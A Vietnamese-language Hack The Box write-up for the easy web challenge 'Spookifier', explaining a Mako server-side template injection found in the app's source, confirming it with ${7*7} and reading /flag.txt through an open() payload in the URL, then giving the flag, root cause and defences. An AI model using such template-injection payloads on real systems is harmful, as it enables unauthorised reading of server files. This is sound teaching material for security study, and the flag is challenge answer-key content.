---
title: "Spookifier"
description: "Khai thác SSTI trong Mako để thực thi biểu thức và đọc flag từ file hệ thống."
platform: "Hack The Box"
category: "Web"
difficulty: "Easy"
publishedAt: 2026-08-08
tags: ["web", "ssti", "mako", "python", "file-read"]
language: "vi"
translationKey: "hack-the-box/spookifier"
draft: false
featured: false
cover: "/images/spookifier/spookifier-05.png"
---

> Write-up này được thực hiện trong môi trường lab có kiểm soát. Chỉ áp dụng các kỹ thuật bên dưới trên hệ thống mà bạn được phép kiểm thử.

## Tổng quan

Spookifier là một ứng dụng biến đổi tên người dùng thành các kiểu chữ Halloween. Input xuất hiện trực tiếp trong URL qua tham số `text`, vì vậy cần kiểm tra xem giá trị đó có được đưa vào template engine hay không.

Lỗ hổng là **Server-Side Template Injection (SSTI)** trong Mako. Sau khi xác nhận biểu thức được thực thi, có thể dùng Mako để đọc `/flag.txt`.

## Recon

Challenge cung cấp web service tại:

```text
http://154.57.164.73:31608/
```

Trang chủ nhận input qua query parameter `text`:

```text
http://154.57.164.73:31608/?text=abc
```

![Trang Spookifier với input abc](https://tameruict.github.io/images/spookifier/spookifier-01.png)

![Trang Spookifier sau khi gửi input testtt](https://tameruict.github.io/images/spookifier/spookifier-06.png)

Giá trị được hiển thị lại dưới nhiều font khác nhau. Việc user input đi thẳng qua URL và được render nhiều lần là dấu hiệu đáng chú ý để kiểm tra SSTI.

## Phân tích source code

Source cho thấy ứng dụng sử dụng Mako:

![Source code import Mako và tạo template](https://tameruict.github.io/images/spookifier/spookifier-02.png)

```python
from mako.template import Template
```

Trong `routes.py`, dữ liệu lấy từ request được chuyển vào hàm `spookify` rồi truyền tới template:

![Route đọc tham số text và gọi spookify](https://tameruict.github.io/images/spookifier/spookifier-03.png)

```python
text = request.args.get('text')
if text:
    converted = spookify(text)
    return render_template('index.html', output=converted)
```

Hàm render tạo một template Mako từ chuỗi kết quả và gọi `.render()`:

```python
return Template(result).render()
```

Do `result` chứa dữ liệu bắt nguồn từ `text`, các biểu thức Mako trong input có cơ hội được đánh giá ở phía server.

## Giải pháp

### 1. Xác nhận SSTI

Gửi biểu thức Mako đơn giản:

```text
http://154.57.164.73:31608/?text=${7*7}
```

Kết quả hiển thị `49`. Điều này chứng minh `${...}` được Mako xử lý, thay vì chỉ được hiển thị như chuỗi văn bản.

![Kết quả 49 khi kiểm tra biểu thức SSTI](https://tameruict.github.io/images/spookifier/spookifier-04.png)

### 2. Đọc flag

Mako cho phép gọi `open` trong context của challenge. Payload đọc file là:

```text
${open('/flag.txt').read()}
```

Khi truyền qua URL, dấu nháy đơn có thể URL-encode thành `%27`:

```text
http://154.57.164.73:31608/?text=${open(%27/flag.txt%27).read()}
```

Kết quả trả về là:

![Flag trả về qua payload đọc file](https://tameruict.github.io/images/spookifier/spookifier-05.png)

```text
HTB{t3mp1at3_1nj3ct10n_c4n_3x1s+5_4nywh3r3!}
```

## Nguyên nhân gốc

Ứng dụng tạo template Mako mới từ chuỗi có chứa input của người dùng rồi gọi `Template(result).render()`. Đây là khác biệt quan trọng giữa việc truyền dữ liệu vào một template cố định và việc biến dữ liệu thành template source. Cách thứ hai cho phép input trở thành code template.

## Phòng thủ

- Không tạo template từ dữ liệu người dùng. Dùng template cố định và truyền tên cần hiển thị qua context.
- Escape output đúng ngữ cảnh; không dựa vào blacklist các chuỗi `${...}`.
- Nếu bắt buộc dùng template động, giới hạn context, callable và module có thể truy cập; không expose các hàm như `open`.
- Chạy service với quyền tối thiểu, tách file secret khỏi web process và ngăn truy cập tới các file không cần thiết.
- Thêm unit test và security test cho các input có thể đi qua Mako/Jinja2; giám sát các expression bất thường trong query string.

## Bài học

Dấu hiệu quan trọng nhất là dữ liệu xuất hiện trong URL nhưng lại được xử lý ở server. Một phép tính như `${7*7}` đủ để phân biệt output formatting bình thường với SSTI thực sự.
